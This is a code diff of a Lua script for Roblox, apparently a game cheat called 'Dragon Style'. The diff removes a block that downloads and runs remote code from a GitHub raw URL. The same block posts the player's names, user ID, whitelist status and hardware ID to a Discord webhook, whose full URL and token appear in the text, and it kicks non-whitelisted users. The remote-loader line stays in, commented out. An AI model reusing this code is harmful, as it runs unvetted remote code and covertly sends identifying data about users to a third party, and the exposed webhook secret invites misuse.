@@ -36,49 +36,7 @@ local L_MenuUI_6 = u1:WaitForChild("PlayerGui"):WaitForChild("MenuUI")
 local u12 = nil
 local battleWatcher = false;
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
-
-local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1155612192310317126/LIzFdRk1GtGk2jbWM8ra9H4rEMCE_BDQ5sEMtY5XE_lRCeEwESQwGlrwEma5N-VLAitG"
-local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local plre = game.Players.LocalPlayer
-local DName = plre.DisplayName
-local UName = plre.Name
-
-local response =
-    request(
-    {
-        Url = Webhook_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(
-            {
-                ["content"] = "",
-                ["embeds"] = {
-                    {
-                        ["title"] = "Dragon Style has been executed.",
-                        ["description"] = DName.. " / "..UName.. " has executed Dragon style. \n \n **Whitelist Value** \n".._G.WV.. "\n **UserId** \n "..tostring(plr.UserId),
-                        ["type"] = "rich",
-                        ["color"] = _G.embedcolor,
-                        ["fields"] = {
-                           {
-                        ["name"] = "Hardware Id",
-                        ["value"] = S_hwid,
-                        ["inline"] = true
-                           }
-                        }
-                    }
-                }
-            }
-        )
-    }
-)
-
-if _G.WV == "No" then
-  return plre:Kick("You are not whitelisted")
-end
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
 
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
